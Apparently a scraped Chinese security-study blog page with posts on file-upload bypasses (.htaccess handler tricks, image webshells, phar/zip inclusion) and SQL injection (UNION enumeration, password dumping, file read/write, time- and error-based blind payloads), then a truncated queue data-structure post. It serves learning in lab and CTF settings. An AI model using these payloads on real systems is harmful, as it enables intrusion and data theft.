<h3 id="一些文件上传的绕过方法"><a href="#一些文件上传的绕过方法" class="headerlink" title="一些文件上传的绕过方法"></a>一些文件上传的绕过方法</h3><h4 id="黑名单文件类型"><a href="#黑名单文件类型" class="headerlink" title="黑名单文件类型"></a>黑名单文件类型</h4><p><img src="/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
<p>这时可以使用bp抓包，把名字改一下即可绕过。比如在.php后加个空格、改个大小写、用php5、phtml此类扩展名。</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type：<a href="https://www.fujieace.com/penetration-test/file-upload-mime.html" target="_blank" rel="noopener">相关内容。</a></p>
<h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><ol>
<li>可以进用JS</li>
<li>可以f12查看源代码，然后把有关验证JS的链接给删除。</li>
<li>抓包绕过前端检测【[ACTF2020 新生赛]Upload】</li>
</ol>
<h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
<p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
<p><a href="http://albatross-g.site/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/" target="_blank" rel="noopener">详情见我之前的文章。</a></p>
<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>这题是在ctfhub里刷到的一道比较新颖的题【我见识短浅】，来好好的记录一下啦。</p>
<p>这道题参考了<a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">这篇博客。</a></p>
<blockquote>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>根据上面文档的总结，修改.htaccess文件大致上有两种方法：</p>
<ul>
<li><pre><code>AddType application/x-httpd-php .png   //png就是修改为的文件类型
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  将此文件命名为.htaccess上传即可</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
&lt;FilesMatch &quot;muma.php&quot;&gt;   
//双引号里就是匹配的文件名，也就是一句话木马的文件名【没有.php好像也可以】
    SetHandler application/x-httpd-php
&lt;FilesMatch&gt;
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">二者选一上传之后再上传muma.png，这个配置文件就可以帮你把png改成php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文件包含</span><br><span class="line"></span><br><span class="line">### %00截断</span><br><span class="line"></span><br><span class="line">%00截断基本已经全部禁用，可以参考[这篇](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zpy1998zpy&#x2F;article&#x2F;details&#x2F;80545408)。</span><br><span class="line"></span><br><span class="line">### phar&#x2F;zip协议</span><br><span class="line"></span><br><span class="line">我们可能会遇到以下两种限制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<p>此时我们可以实行以下操作：</p>
<ol>
<li>创建一个1.php，里面写入php代码【phpinfo()】。</li>
<li>将此文件重命名为1.jpg【代码限制要jpg】。</li>
<li>压缩1.jpg为1.zip</li>
</ol>
<p>构建payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c.jpg</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c.jpg</span><br></pre></td></tr></table></figure>





<p>接下来这种情况也会遇到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    include($file.&quot;.jpg&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时重复以上三步并构建：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-10</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="消除之后字符串的几种方法"><a href="#消除之后字符串的几种方法" class="headerlink" title="消除之后字符串的几种方法"></a>消除之后字符串的几种方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;George&#39; &amp;23   [%23 url解码后是#]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --%20   [%20 url解码后是space]</span><br><span class="line"></span><br><span class="line">?name&#x3D;George&#39; --+   [+ url解码后是space]</span><br></pre></td></tr></table></figure>



<h2 id="怎么测试自己想要输入的东西"><a href="#怎么测试自己想要输入的东西" class="headerlink" title="怎么测试自己想要输入的东西"></a>怎么测试自己想要输入的东西</h2><p>使用union函数</p>
<p><strong>注意：使用union要注意前后列数相同</strong></p>
<h2 id="怎么确定有多少列？"><a href="#怎么确定有多少列？" class="headerlink" title="怎么确定有多少列？"></a>怎么确定有多少列？</h2><blockquote>
<p>order by n 指的是根据第n列进行排序，而当n&gt;真实列数之后就会报错</p>
</blockquote>
<h2 id="怎么回显出你想要的数据？"><a href="#怎么回显出你想要的数据？" class="headerlink" title="怎么回显出你想要的数据？"></a>怎么回显出你想要的数据？</h2><p>正常回显一般显示第一行数据，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p>会回显：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
<p>此时需要使第一个条件无法检索出来数据，例如使用不存在的字段‘To’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;To&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p>会回显：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
<h2 id="怎么判断一个表、列、字段是否存在？"><a href="#怎么判断一个表、列、字段是否存在？" class="headerlink" title="怎么判断一个表、列、字段是否存在？"></a>怎么判断一个表、列、字段是否存在？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select exists (查询语句)</span><br><span class="line">select exists (select * from sql_1)</span><br></pre></td></tr></table></figure>

<p>sql注入时，可以：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select * from sql_1) --+</span><br></pre></td></tr></table></figure>

<p>测试是否有叫  ‘sql_1’  的表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; union select exists (select username from sql_1) --+</span><br></pre></td></tr></table></figure>

<p>测试是否有叫  ‘username’  的列名</p>
<h2 id="几种sql注入方法"><a href="#几种sql注入方法" class="headerlink" title="几种sql注入方法"></a>几种sql注入方法</h2><h3 id="最蠢的猜"><a href="#最蠢的猜" class="headerlink" title="最蠢的猜"></a>最蠢的猜</h3><ol>
<li><p>判断注入点【数字型？字符型？通配型？】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39;</span><br><span class="line">通过回显判断注入点</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断列数【order函数】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; order by 3 --+</span><br><span class="line">寻找报错和不报错的临界值</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜库名、表名、列名【and exists】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_2) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;Tony&#39; and exists(select * from sql_3) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/4.png" alt="4"></p>
</li>
<li><p>爆出字段名【union select】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;xxxxx&#39; union select 1,pw,username  from sql_2 where id&#x3D;2--+</span><br><span class="line">改变id的值可以查看所有字段的值</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/5.png" alt="5"></p>
</li>
</ol>
<h3 id="最基本的注入步骤"><a href="#最基本的注入步骤" class="headerlink" title="最基本的注入步骤"></a>最基本的注入步骤</h3><p>先了解一下各类数据表的位置和结构【自己画的好看吧嘿嘿】：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/sql%E7%BB%93%E6%9E%84.jpg" alt="sql结构"></p>
<p>第一步：判断是否存在注入点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39;</span><br></pre></td></tr></table></figure>

<p>第二步：确定注入点以后，确定列数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; order by 3 --+</span><br></pre></td></tr></table></figure>

<p>第三步：确定数据库的名字【test】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php?username&#x3D;xxxxxxx&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/6.png" alt="6"></p>
<blockquote>
<p>这里之所以是“1,database(),3”是因为之前确定了列数是3列</p>
</blockquote>
<p>如果不要所在数据库的名字，可以使用以下方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure>

<p>第四步：确定数据表的名字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 5,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;sqli&quot; --+</span><br></pre></td></tr></table></figure>

<p>第五步：确定列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-f678feb4bc46bf1b.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;-1&#39; union select 5,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;sqli&quot; and table_name&#x3D;&quot;flag&quot;--+</span><br></pre></td></tr></table></figure>

<p>第六步：获取字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>注：有时会遇到where information_schema.schemata=’hhh’，有时‘hhh’里的单引号会产生意料之外的错误。此时可以对hhh进行十六进制编码。例如where information_schema.schemata=686868</p>
</blockquote>
<h2 id="数据的读取和输出"><a href="#数据的读取和输出" class="headerlink" title="数据的读取和输出"></a>数据的读取和输出</h2><h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select xxx into outfile &quot;绝对路径&quot;</span><br><span class="line">例如：</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,database(),3 into outfile &quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt&quot; --+</span><br></pre></td></tr></table></figure>

<h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>load_file()</p>
<p>replace()</p>
<p>hex()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,load_file(&quot;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;1.txt&quot;),3 --+</span><br><span class="line">或者</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_2.php&#x2F;?username&#x3D;xxx&#39; union select 1,load_file(0x443a2f70687073747564795f70726f2f5757572f312e747874),3 --+【hex编码】</span><br><span class="line">一定要记住：hex转码后，要在前面加上0x</span><br></pre></td></tr></table></figure>







<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a,b,c)</span><br></pre></td></tr></table></figure>

<p>若a为true，则b；若a为假，则c；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(time)</span><br></pre></td></tr></table></figure>

<p>延迟time秒,之后返回0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(str,start,len)</span><br></pre></td></tr></table></figure>

<p>截取str，从start开始截取len长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(a)</span><br></pre></td></tr></table></figure>

<p>将a进行ascii编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str)</span><br></pre></td></tr></table></figure>

<p>获取str的长度</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.确定要求字符串的长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(user())&#x3D;n,sleep(5),1)</span><br></pre></td></tr></table></figure>

<p>2.求字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(mid(user(),1,1))&#x3D;n,sleep(5),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; select gruop_concat(column_name) from information_schema.columns where table_schema &#x3D; 0x[hex] and table_name &#x3D; 0x[hex]</span><br><span class="line"></span><br><span class="line">id&#x3D;1 and if(  ascii( mid(str,1,1) )&#x3D;n,sleep(5),1  )</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and if(mid(user(),n,1) like &#39;r%&#39;,sleep(5),1)</span><br><span class="line">使用通配符，改变n的大小来获取值</span><br></pre></td></tr></table></figure>





<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><h4 id="几个函数-1"><a href="#几个函数-1" class="headerlink" title="几个函数"></a>几个函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(字段名&#x2F;id&#x2F;*) from sql_1</span><br></pre></td></tr></table></figure>

<p>统计id列有多少行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand(n)</span><br></pre></td></tr></table></figure>

<p>随即返回一个0-1之间的浮点数，n参数如果固定则产生的随机数不会改变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floor(n)</span><br></pre></td></tr></table></figure>

<p>对n进行取整操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group by x</span><br></pre></td></tr></table></figure>

<p>以x列中的值为主键进行排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,str3)</span><br></pre></td></tr></table></figure>

<p>连接几个字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit start,len</span><br></pre></td></tr></table></figure>

<p>限制输出的字段个数，从start个字段开始输出len个</p>
<h4 id="步骤拆解"><a href="#步骤拆解" class="headerlink" title="步骤拆解"></a>步骤拆解</h4><p>先来了解如何报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2))x from sql_3 group by x;</span><br></pre></td></tr></table></figure>

<p>此时x=(floor(rand(0)*2))，也就是会生成0，1，1，0，1.</p>
<p>具体为何请移步：<a href="http://albatross-g.site/2020/02/09/sql报错型注入/" target="_blank" rel="noopener">sql报错型注入</a></p>
<p>报错内容为：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/7.png" alt="7"></p>
<p>这个1来自于floor(rand(0)*2)，那我们就可以好好利用这个报错回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x;</span><br></pre></td></tr></table></figure>

<p>报错内容为：</p>
<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/8.png" alt="8"></p>
<p>其中0x7e是~的十六进制</p>
<p>可是此时还需注意一点：</p>
<p>注入时是用的and连接两个select，如果直接这样，二者无交集会报语法错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/9.png" alt="9"></p>
<p>于是构建：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; and (select 1 from(select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from sql_3 group by x)a) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/10.png" alt="10"></p>
<blockquote>
<p>接下来我们要用的时候只需改一下database()这块，不过这块也有许多这样那样的限制，需要多多研究</p>
</blockquote>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_2.php?username&#x3D;John&#39; and (select 1 from(select count(*),(concat((select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2)))x from sql_3 group by x)a) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/11.png" alt="11"></p>
<p>说明第二个数据库的名字叫challenge</p>
<h2 id="几种基础的防sql注入方法"><a href="#几种基础的防sql注入方法" class="headerlink" title="几种基础的防sql注入方法"></a>几种基础的防sql注入方法</h2><h3 id="整数型注入点"><a href="#整数型注入点" class="headerlink" title="整数型注入点"></a>整数型注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>面对整数型注入点可以使用intval()函数，例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval($_GET[&#39;id&#39;])</span><br></pre></td></tr></table></figure>



<p>或者可以range(1,n)创建白名单数组，然后用in_array(src,des)【src是否在des里]】,来检测。但是in_array(src,des)是弱比较类型，可能会存在一定漏洞。然后可以使用gettype()或者var_dump判断数据类型。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/09/%E9%98%9F%E5%88%97/">队列</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-09</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>先进者先出，队列中最基本的操作是：入队enqueue()【放一个数据到队尾】，出队dequeue()【从队列头部取一个数据】。</p>
<h2 id="基础分类"><a href="#基础分类" class="headerlink" title="基础分类"></a>基础分类</h2><h3 id="顺序队列【数组实现】"><a href="#顺序队列【数组实现】" class="headerlink" title="顺序队列【数组实现】"></a>顺序队列【数组实现】</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用数组实现的队列</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 数组：items，数组大小：n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head表示队头下标，tail表示队尾下标</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 申请一个大小为capacity的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果tail == n 表示队列已经满了</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 出队</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果head == tail 表示队列为空</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 为了让其他语言的同学看的更加明确，把--操作放到单独一行来写了</span></span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span 